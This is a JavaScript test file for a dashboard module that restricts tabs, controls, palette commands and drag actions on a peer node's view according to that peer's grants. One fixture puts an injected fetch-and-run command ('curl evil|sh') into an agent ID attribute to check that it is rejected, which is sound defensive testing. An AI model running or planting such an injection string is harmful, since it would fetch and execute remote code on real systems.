import test from 'node:test'; import assert from 'node:assert/strict';
import { createPreactHarness } from './preact-harness.mjs';

const pv = { peer: 'desk', included: ['agents.status', 'groups', 'messaging', 'audit'], omitted: [{ feature: 'costs', requires: 'costs.read' }] };

test('feature and tab states follow the peer_view metadata', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  assert.equal(mod.tabState('groups', pv), 'shared');
  assert.equal(mod.tabState('activity', pv), 'shared', 'Activity is offered for its audit log');
  assert.equal(mod.subtabState('activity', 'audit', pv), 'shared');
  assert.equal(mod.subtabState('activity', 'logs', pv), 'local', 'the daemon log has no peer route');
  assert.equal(mod.subtabState('activity', 'performance', pv), 'local');
  assert.equal(mod.subtabState('activity', 'audit', { ...pv, included: ['agents.status'] }), 'omitted');
  assert.equal(mod.tabState('costs', pv), 'omitted');
  assert.equal(mod.tabState('config', pv), 'local');
  assert.equal(mod.tabState('map', pv), 'shared', 'the map is this operator\'s own fleet view');
  assert.equal(mod.tabState('terminals', pv), 'shared', 'a peer\'s agent opens in this browser\'s Terminals tab');
  assert.equal(mod.tabState('groups', null), 'shared', 'before the first answer the snapshot view is assumed');
  assert.equal(mod.tabState('costs', null), 'omitted');
  assert.equal(mod.limitHint('omitted', 'costs', 'forge'), 'forge does not share costs with you');
  assert.equal(mod.limitHint('local', 'the config tab', 'forge'), 'the config tab is not available in a peer view');
  assert.equal(mod.limitHint('omitted', 'costs', 'forge', ['costs.read']), 'forge does not share costs with you (needs costs.read)');
  assert.equal(mod.limitHint('local', 'The daemon log', 'forge', ['unrestricted trust']), 'forge does not share the daemon log with you (needs unrestricted trust)');
  // The hint names the grant the peer requires, as its omission says.
  const noStatus = { ...pv, included: ['groups'], omitted: [{ feature: 'agents.status', requires: 'agents.status.read' }, { feature: 'agents.manage.full', requires: 'groups.members.delete', unrestricted_only: true }] };
  assert.equal(mod.featureNeeds('agents.status', noStatus), 'agents.status.read');
  assert.equal(mod.tabState('groups', noStatus), 'shared', 'a roster or presence grant alone shows the Groups tab, without agent status');
  const nothing = { ...pv, included: [], omitted: [{ feature: 'groups', requires: 'groups.roster.read' }] };
  assert.equal(mod.tabState('groups', nothing), 'omitted', 'no group the peer sees: nothing to show');
  assert.equal(mod.featureNeeds('agents.manage.full', noStatus), 'unrestricted trust', 'a feature no grant opens names unrestricted trust');
  assert.equal(mod.featureNeeds('groups', noStatus), '', 'a shared feature needs nothing');
  assert.equal(mod.featureNeeds('local_dashboard', noStatus), 'unrestricted trust');
  assert.equal(mod.featureNeeds('local_dashboard', { level: 'unrestricted' }), '');
});

test('on a peer view, blocked controls are greyed and clicks never reach their handlers', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const doc = harness.document;
  doc.body.innerHTML = `<nav><a data-tab="groups">Groups</a><a data-tab="costs">Costs</a><a data-tab="config">Config</a></nav>
    <button id="retire" data-act="retire-agent">retire</button><button id="dot" data-act="dot-toggle">dot</button><button id="menu" data-act="group-menu">⚙</button>
    <button id="group-create-open">+ new group</button><button id="filter">filter</button>`;
  const snapshot = harness.signals.signal({ peer_view: pv });
  const toasts = [];
  doc.documentElement.dataset.remoteNodeName = 'forge';
  const dispose = mod.installPeerViewLimits({ doc, snapshot, toast: (m) => toasts.push(m), remote: { id: 'inst_forge7' } });
  const tab = (name) => doc.querySelector(`[data-tab="${name}"]`);
  assert.equal(tab('groups').classList.contains('pv-off'), false);
  assert.equal(tab('costs').classList.contains('pv-off'), true);
  assert.equal(tab('costs').getAttribute('title'), 'forge does not share costs with you (needs costs.read)');
  // linkedom does not order capture before target listeners, so assert the
  // guard's decision (the dashsnap peer-view state proves the browser order).
  const prevented = Object.fromEntries(['retire', 'dot', 'menu', 'group-create-open', 'filter'].map((id) => [id, harness.fireEvent(doc.getElementById(id), 'click').defaultPrevented]));
  assert.deepEqual(prevented, { retire: true, dot: true, menu: false, 'group-create-open': true, filter: false }, 'mutations (the power dot included) and management controls are stopped; view-only controls work');
  assert.equal(toasts.length, 3);
  // Keyboard activation of a role=button chip never reaches its own keydown.
  const enter = harness.fireEvent(doc.getElementById('retire'), 'keydown', { key: 'Enter' });
  assert.equal(enter.defaultPrevented, true);
  assert.equal(harness.fireEvent(doc.getElementById('filter'), 'keydown', { key: 'Enter' }).defaultPrevented, false);
  harness.fireEvent(tab('costs'), 'click');
  assert.equal(toasts.at(-1), 'forge does not share costs with you (needs costs.read)');
  snapshot.value = { peer_view: { ...pv, included: [...pv.included, 'costs'], omitted: [] } };
  assert.equal(tab('costs').classList.contains('pv-off'), false, 'a new grant lights the tab up on the next snapshot');
  assert.equal(tab('costs').getAttribute('title'), null, 'and drops the stale reason');
  dispose();
  assert.equal(harness.fireEvent(doc.getElementById('retire'), 'click').defaultPrevented, false);
});

test('on a peer view, Activity subtabs without a peer route are greyed and refused', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const doc = harness.document;
  doc.body.innerHTML = `<nav><a data-tab="activity">Activity</a></nav><section id="tab-activity">
    <a class="activity-subtab" data-subtab="audit" title="Audit log">Audit</a><a class="activity-subtab" data-subtab="logs">Logs</a>
    <a class="activity-subtab" data-subtab="performance">Performance</a></section>`;
  const toasts = [];
  doc.documentElement.dataset.remoteNodeName = 'forge';
  const dispose = mod.installPeerViewLimits({ doc, snapshot: harness.signals.signal({ peer_view: pv }), toast: (m) => toasts.push(m), remote: { id: 'inst_forge7' } });
  const sub = (name) => doc.querySelector(`[data-subtab="${name}"]`);
  assert.equal(doc.querySelector('[data-tab="activity"]').classList.contains('pv-off'), false);
  assert.equal(sub('audit').classList.contains('pv-off'), false);
  assert.equal(sub('audit').getAttribute('title'), 'Audit log');
  assert.equal(sub('logs').classList.contains('pv-off'), true);
  assert.equal(sub('logs').getAttribute('title'), 'forge does not share the daemon log with you (needs unrestricted trust)');
  assert.equal(sub('logs').getAttribute('aria-disabled'), null, 'a tab keeps its title only: the palette still lists it');
  assert.equal(sub('performance').classList.contains('pv-off'), true);
  assert.equal(harness.fireEvent(sub('audit'), 'click').defaultPrevented, false);
  assert.equal(harness.fireEvent(sub('logs'), 'click').defaultPrevented, true);
  assert.equal(toasts.at(-1), 'forge does not share the daemon log with you (needs unrestricted trust)');
  dispose();
});

test('this node is never limited', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const doc = harness.document;
  doc.body.innerHTML = '<button id="retire" data-act="retire-agent">retire</button>';
  mod.installPeerViewLimits({ doc, snapshot: harness.signals.signal(null), toast: () => {}, remote: undefined });
  assert.equal(harness.fireEvent(doc.getElementById('retire'), 'click').defaultPrevented, false);
});

test('a restricted peer page drags only agent rows whose grants cover a drop', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const doc = harness.document;
  doc.body.innerHTML = '<table><tr id="a" class="dnd-draggable" data-dnd-agent="agt_a"><td>a</td></tr><tr id="b" class="dnd-draggable" data-dnd-agent="agt_b"><td>b</td></tr></table><summary id="g" data-group-reorder="ops">ops</summary>';
  const snapshot = harness.signals.signal({ peer_view: { included: ['agents.status'], agents: { agt_a: ['groups.members.retire'] } } });
  const stop = mod.installPeerViewLimits({ doc, snapshot, toast: () => {}, remote: { id: 'inst_forge7' } });
  t.after(stop);
  assert.equal(harness.fireEvent(doc.getElementById('a'), 'dragstart').defaultPrevented, false, 'its retire grant lets it drag to the bin');
  assert.equal(harness.fireEvent(doc.getElementById('b'), 'dragstart').defaultPrevented, true);
  assert.equal(harness.fireEvent(doc.getElementById('g'), 'dragstart').defaultPrevented, true, 'group drags stay unrestricted-only');
});

test('palette commands and tab routing respect what the peer offers', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const remote = { id: 'inst_forge7' };
  const cmds = [
    { label: 'Shut down all' },
    { label: 'Expand group: ops', peerView: 'view' },
    { label: 'Go to Costs', peerView: 'tab', tab: 'costs' },
    { label: 'Go to Groups', peerView: 'tab', tab: 'groups' },
    { label: 'Announce', peerView: 'messaging' },
  ];
  const out = mod.limitPeerViewCommands(cmds, { peer_view: pv }, remote);
  assert.deepEqual(out.map((c) => c.enabled !== false), [false, true, false, true, true]);
  assert.match(out[2].disabledReason, /does not share costs with you \(needs costs\.read\)/);
  assert.equal(mod.limitPeerViewCommands(cmds, { peer_view: pv }, undefined), cmds, 'this node: untouched');
  // Unrestricted trust runs every command on the peer but this machine's own
  // windows, terminals and files; a restricted peer's agent lifecycle follows
  // its grants.
  const more = [
    ...cmds,
    { label: 'Focus window: ada', peerView: 'own' },
    { label: 'Stop agent: ada', grant: { act: 'dot-toggle', agent: 'agt_ada', dataset: { online: '1' } } },
    { label: 'Retire agent: ada', grant: { act: 'retire-agent', agent: 'agt_ada' } },
    { label: 'Spawn agent in ops…', peerView: 'spawn' },
  ];
  const full = mod.limitPeerViewCommands(more, { peer_view: { level: 'unrestricted' } }, remote);
  assert.deepEqual(full.map((c) => c.enabled !== false), [true, true, true, true, true, false, true, true, true]);
  assert.match(full[5].disabledReason, /windows, terminals and files stay on/);
  const granted = mod.limitPeerViewCommands(more, { peer_view: { included: ['agents.status', 'spawn.request'], agents: { agt_ada: ['groups.members.stop'] } } }, remote);
  assert.deepEqual(granted.slice(5).map((c) => c.enabled !== false), [false, true, false, true], 'stop is granted, retire is not');
  assert.match(granted[7].disabledReason, /does not share this agent's lifecycle with you \(needs groups\.members\.retire\)/);
  assert.equal(mod.peerViewTabUsable('costs', { remote, peerView: pv }), false);
  assert.equal(mod.peerViewTabUsable('activity', { remote, peerView: pv }), true);
  assert.equal(mod.peerViewSubtabUsable('activity', 'audit', { remote, peerView: pv }), true);
  assert.equal(mod.peerViewSubtabUsable('activity', 'logs', { remote, peerView: pv }), false);
  assert.equal(mod.peerViewSubtabUsable('activity', 'performance', { remote, peerView: null }), true, 'unrestricted trust may serve it: a deep link waits');
  assert.equal(mod.peerViewSubtabUsable('activity', 'audit', { remote, peerView: null }), true, 'a deep link waits for the peer to answer');
  assert.equal(mod.peerViewSubtabUsable('activity', 'logs', { remote: undefined }), true);
  assert.equal(mod.peerViewTabUsable('config', { remote, peerView: null }), false, 'no peer route at all');
  assert.equal(mod.peerViewTabUsable('costs', { remote, peerView: null }), true, 'a deep link waits for the peer to answer');
  assert.equal(mod.peerViewTabUsable('config', { remote: undefined }), true);
  assert.equal(mod.peerViewTabUsable('terminals', { remote, peerView: pv }), true);
});

test('a peer agent\'s terminal action opens it in the browser terminal', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const doc = harness.document;
  doc.body.innerHTML = '<button id="win" data-act="web-open-window" data-agent="agt_abc123">web window</button><button id="gt" data-act="group-web-term">group term</button><button id="evil" data-act="jump" data-agent="agt_x;curl evil|sh">evil</button><nav><a id="tt" data-tab="terminals" href="/terminals">Terminals</a><a id="ct" data-tab="config" href="/config">Config</a></nav>';
  doc.documentElement.dataset.remoteNodeName = 'forge';
  const opened = []; const toasts = [];
  const dispose = mod.installPeerViewLimits({ doc, snapshot: harness.signals.signal({ peer_view: pv }), toast: (m, err) => toasts.push([m, err]), remote: { id: 'inst_forge7' }, openTerminal: async (o) => { opened.push(o); } });
  assert.equal(harness.fireEvent(doc.getElementById('win'), 'click').defaultPrevented, true, 'the local terminal handler never runs');
  assert.equal(opened.length, 1);
  assert.deepEqual({ instance: opened[0].instance, agent: opened[0].agent, peerLabel: opened[0].peerLabel }, { instance: 'inst_forge7', agent: 'agt_abc123', peerLabel: 'forge' });
  harness.fireEvent(doc.getElementById('gt'), 'click');
  assert.equal(toasts.at(-1)[0], 'This action is not available in a peer view', 'a group directory terminal has nothing to attach to');
  harness.fireEvent(doc.getElementById('evil'), 'click');
  assert.equal(opened.length, 1, 'an agent ID that is not a plain agt_ ID is never opened');
  assert.equal(toasts.at(-1)[0], 'This action is not available in a peer view');
  assert.equal(harness.fireEvent(doc.getElementById('ct'), 'click').defaultPrevented, true, 'a tab with no peer route stays blocked');
  assert.equal(harness.fireEvent(doc.getElementById('tt'), 'click').defaultPrevented, false, 'the Terminals tab, where the peer\'s agent opened, can be shown');
  dispose();
});

test('the greying rule is generated from what the peer shares and removed on dispose', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const doc = harness.document;
  const snapshot = harness.signals.signal({ peer_view: { included: ['agents.status', 'lifecycle.resume', 'messaging'], agents: { agt_ada1: ['groups.members.resume'] } } });
  const dispose = mod.installPeerViewLimits({ doc, snapshot, toast: () => {}, remote: { id: 'inst_forge7' } });
  const rule = () => doc.getElementById('peer-view-limits-style')?.textContent || '';
  assert.match(rule(), /^html\.remote-node \[data-act\]:not\(/);
  for (const usable of ['[data-act="jump"]', '[data-act="web-open-window"]', '[data-act="terminal-chooser"]', '[data-act="message-new"]', '[data-act="dot-toggle"]:not([data-online="1"])[data-agent="agt_ada1"]', '[data-act="row-menu"]']) {
    assert.ok(rule().includes(usable), `${usable} stays usable`);
  }
  assert.ok(!rule().includes('[data-act="restart"]') && !rule().includes('[data-act="spawn-agent"]'));
  await harness.act(() => { snapshot.value = { peer_view: { included: ['agents.status', 'spawn'] } }; });
  assert.ok(rule().includes('[data-act="spawn-agent"]') && !rule().includes('[data-act="message-new"]'), 'recomputed with the snapshot');
  doc.body.innerHTML = `<b id="spawn" data-act="spawn-agent"></b><b id="restart" data-act="restart"></b><b id="jump" data-act="jump"></b>
    <div id="fleetview-fused-groups-root"><b id="fused-restart" data-act="restart"></b></div>`;
  doc.documentElement.classList.add('remote-node');
  const sel = rule().replace(/ \{[^}]*\}$/, '');
  assert.equal(doc.getElementById('spawn').matches(sel), false);
  assert.equal(doc.getElementById('jump').matches(sel), false);
  assert.equal(doc.getElementById('restart').matches(sel), true);
  assert.equal(doc.getElementById('fused-restart').matches(sel), false, 'the all-nodes view greys its rows per node itself');
  assert.equal(mod.blockedControl(doc.getElementById('fused-restart'), null), null, 'and guards them per node');
  dispose();
  assert.equal(doc.getElementById('peer-view-limits-style'), null);
});

test('the spawn button stays usable for a spawn request or an older peer\'s spawn feature', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const usable = (included) => mod.usableActSelectors({ included: ['agents.status', ...included] });
  assert.ok(usable(['spawn.request']).includes('[data-act="spawn-agent"]'));
  assert.ok(usable(['spawn']).includes('[data-act="spawn-agent"]'), 'an older peer only offers spawn');
  assert.ok(!usable([]).includes('[data-act="spawn-agent"]'));
});

test('on a peer view, the Groups toolbar controls follow the peer\'s management grants', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const doc = harness.document;
  doc.body.innerHTML = `<button id="prof" data-act="set-dash-profile">🧠</button><button id="sbx" data-act="set-dash-sandbox-profile">🛡</button>
    <button id="group-create-open">+ new group</button>`;
  const snapshot = harness.signals.signal({ peer_view: pv });
  const toasts = [];
  doc.documentElement.dataset.remoteNodeName = 'forge';
  const dispose = mod.installPeerViewLimits({ doc, snapshot, toast: (m) => toasts.push(m), remote: { id: 'inst_forge7' } });
  const clicks = () => Object.fromEntries(['prof', 'sbx', 'group-create-open'].map((id) => [id, harness.fireEvent(doc.getElementById(id), 'click').defaultPrevented]));
  assert.deepEqual(clicks(), { prof: true, sbx: true, 'group-create-open': true });
  assert.equal(toasts[0], 'forge does not share its global spawn defaults with you');
  assert.match(doc.getElementById('peer-view-managed-style').textContent, /#group-create-open/);
  snapshot.value = { peer_view: { ...pv, included: [...pv.included, 'spawn.defaults', 'groups.create'] } };
  assert.deepEqual(clicks(), { prof: true, sbx: true, 'group-create-open': false }, 'the pickers also need the peer\'s profile lists');
  snapshot.value = { peer_view: { ...pv, included: [...pv.included, 'spawn.defaults', 'spawn.catalog', 'groups.create'] } };
  assert.deepEqual(clicks(), { prof: false, sbx: false, 'group-create-open': false }, 'shared grants run the regular dialogs');
  assert.equal(doc.getElementById('peer-view-managed-style'), null, 'nothing left to grey');
  assert.match(doc.getElementById('peer-view-limits-style').textContent, /\[data-act="set-dash-profile"\]/);
  assert.ok(mod.usableActSelectors(snapshot.value.peer_view).includes('[data-act="set-dash-sandbox-profile"]'));
  dispose();
});

test('group controls follow the grants the peer names per group; unrestricted trust holds them all', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const doc = harness.document;
  const restricted = { ...pv, level: 'restricted', included: [...pv.included, 'spawn.catalog'], groups: { ops: ['groups.settings', 'groups.members.spawn.cwd'], 'a"b': ['groups.settings', 'groups.members.spawn.sandbox'] } };
  assert.equal(mod.groupGrantHeld('set-group-dir', 'ops', restricted), true);
  assert.equal(mod.groupGrantHeld('set-group-dir', 'a"b', restricted), false, "a group's default directory also needs the spawn directory grant");
  assert.equal(mod.groupGrantHeld('set-group-profile', 'ops', restricted), true);
  assert.equal(mod.groupGrantHeld('set-group-profile', 'ops', { ...restricted, included: pv.included }), false, "the profile picker reads the peer's spawn catalog");
  assert.equal(mod.groupGrantHeld('set-group-sandbox-profile', 'ops', restricted), false, 'a sandbox profile also needs the spawn sandbox grant');
  assert.equal(mod.groupGrantHeld('set-group-sandbox-profile', 'a"b', restricted), true);
  assert.equal(mod.groupGrantHeld('set-group-dir', 'build', restricted), false, 'another group holds nothing');
  assert.equal(mod.groupGrantHeld('retire-agent', 'ops', restricted), false, 'only group controls are grant-gated');
  assert.equal(mod.groupGrantHeld('set-group-dir', 'anything', { level: 'unrestricted' }), true);
  assert.equal(mod.groupGrantHeld('advance-phase', 'ops', restricted), false, 'what no peer grant covers takes unrestricted trust');
  assert.equal(mod.groupGrantHeld('stand-down-force', 'anything', { level: 'unrestricted' }), true);
  assert.equal(mod.groupGrantHeld('group-settings', 'ops', restricted), true, "the ⚙ menu's settings items ride on groups.settings");
  assert.equal(mod.groupGrantHeld('nest-group', 'build', restricted), false);
  for (const act of ['clone-group', 'delete-group', 'cleanup-group']) {
    assert.equal(mod.groupGrantHeld(act, 'ops', restricted), false, `${act} takes unrestricted trust whatever the group's grants`);
    assert.equal(mod.groupGrantHeld(act, 'ops', { level: 'unrestricted' }), true);
  }
  assert.equal(mod.groupFieldHeld('set-group-environment', 'ops', restricted), false, 'the environment is its own grant');
  assert.equal(mod.groupFieldHeld('set-group-environment', 'ops', null), true, "this node's own group holds every field");
  // An agent's controls follow the grants the peer holds in all of its groups.
  const agents = { ...restricted, agents: { agt_solo: ['groups.members.manage'] } };
  assert.equal(mod.agentGrantHeld('edit-member', 'agt_solo', agents), true);
  assert.equal(mod.agentGrantHeld('edit-member', 'agt_shared', agents), false, 'an agent without the grant in every group');
  assert.equal(mod.agentGrantHeld('edit-member', 'agt_shared', { level: 'unrestricted' }), true);
  doc.body.innerHTML = '<button id="solo-notify" data-act="toggle-agent-notify" data-agent="agt_solo"></button><button id="shared-notify" data-act="toggle-agent-notify" data-agent="agt_shared"></button>';
  assert.equal(mod.blockedControl(doc.getElementById('solo-notify'), agents), null, 'a granted agent control runs its own handler');
  assert.equal(mod.blockedControl(doc.getElementById('shared-notify'), agents).state, 'omitted');
  assert.deepEqual(mod.blockedControl(doc.getElementById('shared-notify'), agents).needs, ['groups.members.manage']);
  assert.equal(mod.grantHeld(doc.getElementById('solo-notify'), agents), true);
  assert.ok(mod.grantSelectors(agents).includes('[data-act="toggle-agent-notify"][data-agent="agt_solo"]'));
  assert.ok(!mod.grantSelectors(agents).some((sel) => sel.includes('agt_shared')));
  for (const act of ['toggle-remote-control', 'fast-mode-set', 'reincarnate', 'delete-agent']) {
    assert.equal(mod.agentGrantHeld(act, 'agt_solo', agents), false, `${act} takes unrestricted trust whatever the agent's grants`);
    assert.equal(mod.agentGrantHeld(act, 'agt_solo', { level: 'unrestricted' }), true);
  }
  assert.equal(mod.groupGrantHeld('remove-member', 'ops', restricted), false);
  assert.equal(mod.groupGrantHeld('remove-member', 'ops', { level: 'unrestricted' }), true);

  doc.body.innerHTML = `<span id="ops-dir" data-act="set-group-dir" data-group="ops"><span id="ops-text" data-act="group-web-term" data-group="ops">~/src</span></span>
    <span id="build-dir" data-act="set-group-dir" data-group="build">x</span>`;
  const el = (id) => doc.getElementById(id);
  assert.equal(mod.blockedControl(el('ops-dir'), restricted), null, 'a granted control runs its own handler');
  assert.equal(mod.blockedControl(el('ops-text'), restricted, { ctrlKey: false }), null, "a plain click on the chip's text opens its editor");
  assert.equal(mod.blockedControl(el('ops-text'), restricted, { ctrlKey: true }).state, 'local', 'Ctrl-click opens a terminal: never on a peer');
  const refused = mod.blockedControl(el('build-dir'), restricted);
  assert.equal(refused.state, 'omitted');
  assert.equal(mod.limitHint(refused.state, refused.what, 'forge', refused.needs), "forge does not share this group's settings with you (needs groups.settings + groups.members.spawn.cwd)");
  assert.deepEqual(mod.grantMissing(el('ops-dir'), { ...restricted, groups: { ops: ['groups.settings'] } }), ['groups.members.spawn.cwd'], 'only what is missing is named');
  assert.deepEqual(mod.groupFieldMissing('set-group-sandbox-profile', 'ops', restricted), ['groups.members.spawn.sandbox']);
  assert.deepEqual(mod.groupFieldMissing('set-group-dir', 'ops', null), [], "this node's own group lacks nothing");
  // A group's message is the regular dialog under unrestricted trust; a
  // restricted peer sharing messaging takes it one agent at a time.
  doc.body.innerHTML = `<button id="ops-msg" data-act="message-new" data-group="ops" data-prefill='{"targetMode":"group","groupName":"ops"}'>✉</button>`;
  const messaging = { ...restricted, included: [...(restricted.included || []), 'messaging'] };
  assert.deepEqual(mod.blockedControl(el('ops-msg'), messaging).request, { action: 'message', group: 'ops' });
  const silent = { ...restricted, included: (restricted.included || []).filter((f) => f !== 'messaging') };
  assert.equal(mod.blockedControl(el('ops-msg'), silent).state, 'omitted');
  assert.equal(mod.blockedControl(el('ops-msg'), { level: 'unrestricted' }), null);

  // The greying is the same rule, with peer-chosen group names escaped.
  const selectors = mod.groupGrantSelectors(restricted);
  assert.ok(selectors.includes('[data-act="set-group-dir"][data-group="ops"]'));
  assert.ok(selectors.includes('[data-act="set-group-dir"][data-group="ops"] [data-act="group-web-term"]'));
  assert.ok(selectors.includes('[data-act="set-group-sandbox-profile"][data-group="a\\"b"]'));
  assert.ok(!selectors.some((s) => s.includes('set-group-sandbox-profile"][data-group="ops"')));
  assert.ok(mod.groupGrantSelectors({ level: 'unrestricted' }).includes('[data-act="rename-group"]'), 'unrestricted needs no per-group rule');
  assert.ok(mod.groupGrantSelectors(restricted, (g) => `${g}@forge`).includes('[data-act="set-group-dir"][data-group="ops@forge"]'));
});

test('under unrestricted trust a peer page runs every control as the node itself does, except its own machine\'s terminals and pickers', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const doc = harness.document;
  doc.body.innerHTML = '<button id="links" data-act="link-new" data-from="ops">+</button>'
    + '<button id="perm" data-act="perm-edit" data-conv="c1">perm</button>'
    + '<button id="import" id2="x"></button><button id="group-import-open">import</button>'
    + '<button id="shell" data-act="term-dir" data-agent="agt_abc123">sh</button>'
    + '<button id="attach" data-act="jump" data-agent="agt_abc123">⤢</button>'
    + '<nav><button data-tab="jobs">jobs</button><button data-tab="config">config</button></nav>';
  const pv = { peer: 'desk', level: 'unrestricted', included: ['agents.status', 'local_dashboard'], omitted: [{ feature: 'own_node', requires: 'local_only' }] };
  const toasts = [];
  const opened = [];
  const dispose = mod.installPeerViewLimits({ doc, snapshot: harness.signals.signal({ peer_view: pv }), toast: (m) => toasts.push(m), remote: { id: 'inst_forge7' }, openTerminal: async (o) => { opened.push(o); } });
  assert.ok(doc.documentElement.classList.contains('pv-unrestricted'));
  for (const id of ['links', 'perm', 'group-import-open']) assert.equal(harness.fireEvent(doc.getElementById(id), 'click').defaultPrevented, false, id);
  assert.equal(harness.fireEvent(doc.getElementById('shell'), 'click').defaultPrevented, true, 'a shell on the node stays there');
  harness.fireEvent(doc.getElementById('attach'), 'click');
  assert.equal(opened.length, 1, 'an agent terminal still opens through the attach');
  assert.equal(mod.tabState('jobs', pv), 'shared');
  assert.equal(mod.tabState('config', pv), 'local');
  const sel = doc.getElementById('peer-view-limits-style').textContent.replace(/ \{[^}]*\}$/, '');
  doc.documentElement.classList.add('remote-node');
  assert.equal(doc.getElementById('links').matches(sel), false);
  assert.equal(doc.getElementById('shell').matches(sel), true);
  // A restricted peer: the local dashboard reads as not offered, never as requestable.
  assert.equal(mod.tabState('jobs', { included: ['agents.status'], omitted: [{ feature: 'local_dashboard', requires: 'local_only' }] }), 'local');
  dispose();
  assert.ok(!doc.documentElement.classList.contains('pv-unrestricted'));
});

test("a refused control's reason follows what the peer shares, without another hover", async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const doc = harness.document;
  doc.body.innerHTML = '<button data-act="set-group-descr" data-group="ops" title="Edit the description">✎</button>';
  doc.documentElement.dataset.remoteNodeName = 'forge';
  const snapshot = harness.signals.signal({ peer_view: { level: 'restricted', included: ['groups'], groups: {} } });
  const dispose = mod.installPeerViewLimits({ doc, snapshot, toast: () => {}, remote: { id: 'inst_forge7' } });
  const button = doc.querySelector('button');
  harness.fireEvent(button, 'pointerover');
  assert.equal(button.getAttribute('aria-disabled'), 'true');
  assert.match(button.getAttribute('title'), /groups\.settings[\s\S]*Edit the description/);
  snapshot.value = { peer_view: { level: 'restricted', included: ['groups'], groups: { ops: ['groups.settings'] } } };
  assert.equal(button.getAttribute('aria-disabled'), null, 'granted since: no longer disabled');
  assert.equal(button.getAttribute('title'), 'Edit the description', 'its own title is back');
  dispose();
});

test('palette commands only unrestricted trust reaches are off on a restricted peer, with the reason', async (t) => {
  const harness = await createPreactHarness(t);
  const mod = await harness.importDashboardModule('js/peer-view-limits.js');
  const remote = { id: 'inst_forge7' };
  harness.document.documentElement.dataset.remoteNodeName = 'forge';
  const cmds = [{ label: 'Snapshots…', peerView: 'operator', what: 'its snapshot library' }];
  const restricted = mod.limitPeerViewCommands(cmds, { peer_view: { included: ['messaging'] } }, remote);
  assert.equal(restricted[0].enabled, false);
  assert.equal(restricted[0].disabledReason, 'forge does not share its snapshot library with you (needs unrestricted trust)');
  const full = mod.limitPeerViewCommands(cmds, { peer_view: { level: 'unrestricted' } }, remote);
  assert.notEqual(full[0].enabled, false, 'unrestricted trust runs it on the peer');
});
